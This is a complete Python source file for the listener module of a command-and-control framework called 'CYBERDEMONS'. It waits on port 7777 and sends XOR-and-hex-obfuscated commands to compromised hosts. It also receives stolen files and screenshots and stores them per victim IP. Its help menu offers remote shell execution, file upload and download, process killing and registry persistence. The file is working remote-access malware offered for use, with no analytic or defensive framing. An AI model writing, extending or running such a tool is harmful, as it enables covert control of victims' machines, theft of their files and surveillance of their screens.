#!/usr/bin/env python3
import socket
import threading
import os
import sys
import base64
import shutil
from datetime import datetime

KEY = 0x3A
BASE_DIR = os.path.dirname(__file__)

# ANSI cyberpunk colors
C = '\033[36m'   # cyan
M = '\033[35m'   # magenta
G = '\033[92m'   # green
Y = '\033[93m'   # yellow
R = '\033[91m'   # red
D = '\033[90m'   # dim
B = '\033[1m'    # bold
N = '\033[0m'    # reset

BANNER = f'''
{B}{C}  ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗{N}
{C} ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██╔════╝{N}
{C} ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║███████╗{N}
{C} ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║{N}
{C} ╚██████╗   ██║   ██████╔╝███████╗██║  ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║{N}
{C}  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{N}
{B}{M}                         C2 FRAMEWORK v2.0 — LISTENER MODULE{N}
'''

def xor(data: bytes) -> bytes:
    return bytes([b ^ KEY for b in data])

def hex_encode(data: bytes) -> str:
    return data.hex().upper()

def hex_decode(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)

def get_client_dirs(addr):
    ip = addr[0]
    base = os.path.join(BASE_DIR, 'clients', ip)
    dirs = {
        'downloads': os.path.join(base, 'downloads'),
        'screenshots': os.path.join(base, 'screenshots'),
        'uploads': os.path.join(base, 'uploads'),
    }
    for d in dirs.values():
        os.makedirs(d, exist_ok=True)
    return dirs

def save_file_to(path, data, folder):
    fname = f"{datetime.now().strftime('%H%M%S')}_{os.path.basename(path)}"
    fpath = os.path.join(folder, fname)
    with open(fpath, 'wb') as f:
        f.write(data)
    print(f"    {G}[+] Saved to {fpath}{N}")
    return fpath

def handle_client(conn, addr):
    print(f"\n{M}[+] Connection from {addr[0]}:{addr[1]}{N}")
    dirs = get_client_dirs(addr)
    history = []
    try:
        while True:
            try:
                cmd = input(f"{C}CMD{N}> ")
            except (EOFError, KeyboardInterrupt):
                print(f"\n{R}[-] Exiting...{N}")
                break

            if not cmd.strip():
                continue

            if cmd.lower() in ("clear", "cls"):
                os.system("cls" if os.name == "nt" else "clear")
                continue

            if cmd.lower() == "history":
                if not history:
                    print(f"    {D}No commands sent yet{N}")
                else:
                    print(f"    {Y}Command history ({len(history)}):{N}")
                    for i, h in enumerate(history, 1):
                        print(f"    {D}{i:3d}. [{h['time']}]{N} {C}{h['cmd']}{N}")
                continue

            if cmd.lower() == "help":
                print(f"""
{G}Available Commands:{N}
  {C}!shell <cmd>{N}       Execute shell command (or just type the command)
  {C}!cd <dir>{N}          Change directory on target
  {C}!pwd{N}               Print working directory
  {C}!ls <path>{N}         List directory contents
  {C}!download <path>{N}   Download file from target
  {C}!upload <path>{N}     Upload local file to target
  {C}!ps{N}                List processes
  {C}!kill <pid>{N}        Kill process
  {C}!screenshot{N}        Take screenshot
  {C}!sysinfo{N}           Get system information
  {C}!persist{N}           Install registry persistence
  {C}!exit{N}              Disconnect target
  {Y}exit{N}               Disconnect client and exit
  {Y}clear/cls{N}          Clear terminal
  {Y}history{N}            Show command history
  {Y}help{N}               Show this help

{D}Prefix commands with '!' for special handling.
Commands without '!' are executed via cmd.exe /c{N}
                """)
                continue

            history.append({'cmd': cmd, 'time': datetime.now().strftime('%H:%M:%S')})

            if cmd.startswith("!upload "):
                parts = cmd[8:].strip().split(None, 1)
                if not parts:
                    print(f"    {Y}[!] Usage: !upload <local_path> [remote_path]{N}")
                    continue
                local_path = parts[0]
                remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_path)
                if not os.path.isfile(local_path):
                    print(f"    {R}[-] Local file not found: {local_path}{N}")
                    continue
                with open(local_path, "rb") as f:
                    file_data = f.read()
                b64_data = base64.b64encode(file_data).decode()
                cmd = f"!upload {remote_path}|{b64_data}"
                print(f"    {G}[+] Uploading {local_path} ({len(file_data)} bytes) -> {remote_path}{N}")
                dst = os.path.join(dirs['uploads'], os.path.basename(local_path))
                try: shutil.copy2(local_path, dst)
                except: pass

            encoded = hex_encode(xor(cmd.encode()))
            conn.send(encoded.encode() + b"\n")

            if cmd.lower() == "exit":
                break

            try:
                buf = b""
                while True:
                    chunk = conn.recv(8192)
                    if not chunk:
                        break
                    buf += chunk
                    if b"\n" in chunk:
                        break
                data = buf.rstrip(b"\n\r")
            except (ConnectionResetError, ConnectionAbortedError):
                print(f"{R}[-] Connection lost{N}")
                break

            if not data:
                print(f"{R}[-] Disconnected{N}")
                break

            try:
                raw = data.decode().strip()
                decoded = xor(hex_decode(raw))
                result = decoded.decode(errors='replace')

                if result.startswith("[DOWNLOAD]"):
                    rest = result[10:]
                    sep_idx = rest.find('|')
                    if sep_idx != -1:
                        fpath = rest[:sep_idx]
                        b64_data = rest[sep_idx + 1:]
                        try:
                            file_bytes = base64.b64decode(b64_data)
                            fname = save_file_to(fpath, file_bytes, dirs['downloads'])
                            print(f"    {G}[+] Downloaded {len(file_bytes)} bytes from {fpath}{N}")
                        except Exception as e:
                            print(f"    {R}[-] Download decode error: {e}{N}")
                    else:
                        print(result)
                elif result.startswith("[SCREENSHOT]"):
                    rest = result[12:]
                    sep_idx = rest.find('|')
                    if sep_idx != -1:
                        dims = rest[:sep_idx]
                        b64_data = rest[sep_idx + 1:]
                        try:
                            file_bytes = base64.b64decode(b64_data)
                            fname = save_file_to(f"screenshot_{dims}.bmp", file_bytes, dirs['screenshots'])
                            print(f"    {G}[+] Screenshot saved ({dims}, {len(file_bytes)} bytes){N}")
                        except Exception as e:
                            print(f"    {R}[-] Screenshot decode error: {e}{N}")
                    else:
                        print(result)
                else:
                    print(result)
            except Exception as e:
                print(f"{R}[-] Decode error: {e}{N}")

    except Exception as e:
        print(f"{R}[-] Error: {e}{N}")
    finally:
        conn.close()

def start_server(host='0.0.0.0', port=7777):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(f"{G}[+] Listening on {host}:{port}{N}")
    print(f"{D}    XOR key: 0x{KEY:02X}    Type 'help' for commands{N}\n")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print(f"\n{R}[-] Shutting down...{N}")
    finally:
        server.close()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 7777
    start_server(port=port)
